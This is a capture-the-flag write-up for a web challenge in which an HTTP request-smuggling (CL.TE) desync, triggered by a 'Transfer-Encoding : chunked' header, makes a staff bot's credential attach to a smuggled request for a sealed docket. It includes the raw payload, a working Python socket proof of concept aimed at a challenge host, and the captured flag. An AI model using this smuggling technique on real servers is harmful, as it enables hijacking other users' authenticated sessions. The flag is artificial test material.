---
title: "SCC web challenge #4"
description: ""
date: 2026-10-17
tags: []
category: ctf
ctfName: "SCC 2026"
draft: false
---

# The Public Counter — Web-Advanced (400)

**CTF Name:** SCC 2026
**Flag:** `flag{d3sync_f15a3cd534}`

## TL;DR

A CL.TE HTTP request-smuggling desync between a front-end ("desk") that frames by
`Content-Length` and a backend ("clerk") that honors `Transfer-Encoding: chunked`.
The mismatch is reachable via a **header-name mismatch**: the desk compares header
names without trimming, the clerk trims. Writing the header as
`Transfer-Encoding : chunked` (space **before** the colon) hides it from the desk
and is honored by the clerk.

We smuggle an *incomplete* `GET /docket` request. The Directorate's staff bot polls
`/status` through the same path; its next poll request completes the smuggled
`/docket` request, so the bot's staff credential ends up attached to **our** request
and the sealed docket is released to us.

## Recon

The counter exposes:

| Method | Path | Notes |
|---|---|---|
| `POST` | `/enquiry` | body = reference |
| `GET` | `/status` | clerk availability (30 B) |
| `GET` | `/docket` | sealed docket — requires a **staff clerk session** (403) |
| `GET` | `/notes` | staff operating notes (leaks the whole mechanism) |

`GET /docket` without a session:

```
HTTP/1.1 403 Forbidden
a staff clerk session is required to release a sealed docket
```

`GET /notes` is the intended hint and describes the two layers verbatim:

* **DESK (front, 1992)** — determines the request boundary from `Content-Length`.
  Rejects a request that states a transfer encoding **and** a length (400).
* **CLERK (behind, 2003)** — honors a chunked transfer encoding, falls back to
  `Content-Length` if none stated. Holds **one** connection and serves enquiries
  in order.
* **THE POLL** — the Directorate's own clerk session polls `/status` every few
  seconds **through the same desk**, carrying a staff credential.
* **NOTE** — "The desk compares a header name WITHOUT trimming it, and the clerk
  trims before comparing." So `Transfer-Encoding : chunked` (space before colon)
  is invisible to the desk and honored by the clerk.

## Root cause

Classic **CL.TE**:

* front-end (desk) → frames with `Content-Length`
* back-end (clerk) → frames with `Transfer-Encoding: chunked`

Normally the desk's "TE + CL ⇒ 400" guard stops this. The space-before-colon
spelling bypasses that guard because the desk's untrimmed name comparison treats
`Transfer-Encoding ` as a different (unknown) header.

Browsers and `curl` won't reproduce it: both normalize/strip the stray space in the
header name before the request leaves the machine. A **raw TCP socket** is required.

Sanity checks against the live service:

```text
# spaced TE + CL → desk does NOT 400; request forwarded
POST /enquiry HTTP/1.1
Host: x
Content-Length: 5
Transfer-Encoding : chunked
                              → 200

# normal TE + CL → desk rejects locally
POST /enquiry HTTP/1.1
Host: x
Content-Length: 5
Transfer-Encoding: chunked
                              → 400 the desk does not accept a transfer encoding with a stated length
```

With the spaced spelling, the clerk parses the body as chunked. `0\r\n\r\n`
terminates the body immediately, so any bytes that follow inside the
Content-Length-declared body are parsed by the clerk as a **new pipelined
request**.

## Exploit

Two ingredients:

1. The desk must forward the payload. Set `Content-Length` to cover the full body
   (`0\r\n\r\n` + smuggled bytes); the desk counts those bytes as the enquiry body
   and forwards them untouched.
2. The smuggled request must be **incomplete** (headers not terminated) so that the
   bot's next poll bytes are appended to it. That turns the bot's request line into
   a throwaway header value and, crucially, leaves the bot's **credential header**
   attached to our `GET /docket`.

Payload:

```http
POST /enquiry HTTP/1.1
Host: x
Content-Length: 44
Transfer-Encoding : chunked

0

GET /docket HTTP/1.1
Host: x
X-Pad: 
```

* `0\r\n\r\n` → clerk ends the POST body; returns the enquiry reply.
* `GET /docket HTTP/1.1` + `Host: x` + `X-Pad: ` (no final CRLF/CRLFCRLF) → clerk
  starts a second request and waits for the rest of the headers.
* The staff bot's next poll lands here, e.g.:

  ```http
  GET /status HTTP/1.1
  Host: ...
  <staff-credential-header>: ...
  ```

  which the clerk reads as:

  ```http
  GET /docket HTTP/1.1
  Host: x
  X-Pad: GET /status HTTP/1.1
  Host: ...
  <staff-credential-header>: ...
  ```

  → an authenticated staff-session request for the sealed docket, whose response is
  routed back over the shared path to our waiting connection.

Note: do **not** send a follow-up request while the prefix is pending — your own
bytes would complete it with unauthenticated headers (403). Best results came from
sending the payload and simply reading (the bot polls within seconds).

### PoC (raw socket)

```python
import socket, time

HOST, PORT = "ec2-44-248-216-254.us-west-2.compute.amazonaws.com", 8088

s = socket.create_connection((HOST, PORT), timeout=10)
prefix = b"GET /docket HTTP/1.1\r\nHost: x\r\nX-Pad: "   # deliberately unterminated
body = b"0\r\n\r\n" + prefix
req = (b"POST /enquiry HTTP/1.1\r\nHost: x\r\n"
       b"Content-Length: " + str(len(body)).encode() + b"\r\n"
       b"Transfer-Encoding : chunked\r\n"                 # space before colon
       b"Connection: keep-alive\r\n\r\n" + body)
s.sendall(req)

buf = b""
s.settimeout(0.5)
end = time.time() + 20
while time.time() < end:
    try:
        d = s.recv(65535)
        if not d:
            break
        buf += d
        if b"flag{" in buf:
            break
    except socket.timeout:
        continue
print(buf.decode("utf-8", "replace"))
```

Output:

```
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 66
Connection: keep-alive

docket released to the bearer

CLEARANCE  flag{d3sync_f15a3cd534}
```

## Flag

```
flag{d3sync_f15a3cd534}
```
